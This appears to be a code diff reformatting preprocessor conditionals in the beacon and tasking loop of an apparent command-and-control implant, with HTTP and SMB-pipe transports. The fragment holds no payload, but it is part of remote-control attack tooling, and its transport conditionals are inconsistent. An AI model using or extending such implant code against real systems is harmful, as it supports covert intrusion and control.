@@ -192,13 +192,13 @@ namespace Dispatcher {
         retry:
         if (!Ctx->transport.outbound_queue) {
 
-#if     defined(TRANSPORT_SMB)
-            return_defer(ERROR_SUCCESS);
-#elif   defined(TRANSPORT_HTTP)
-            auto entry = Stream::CreateStreamWithHeaders(TypeTasking);
-            OutboundQueue(entry);
+#ifdef TRANSPORT_SMB
+        return_defer(ERROR_SUCCESS);
+#elifdef TRANSPORT_HTTP
+        auto entry = Stream::CreateStreamWithHeaders(TypeTasking);
+        OutboundQueue(entry);
 
-            goto retry;
+        goto retry;
 #endif
         } else {
             if (!PrepareQueue(out)) {
@@ -206,13 +206,12 @@ namespace Dispatcher {
             }
         }
 
-#if     defined(TRANSPORT_HTTP)
-            Network::Http::HttpCallback(out, &in);
-#elif   defined(TRANSPORT_PIPE)
-            Network::Smb::SmbSend(out);
-            Network::Smb::SmbReceive(&in);
+#ifdef TRANSPORT_HTTP
+        Network::Http::HttpCallback(out, &in);
+#elif TRANSPORT_PIPE
+        Network::Smb::SmbSend(out);
+        Network::Smb::SmbReceive(&in);
 #endif
-
         Stream::DestroyStream(out);
 
         if (in) {
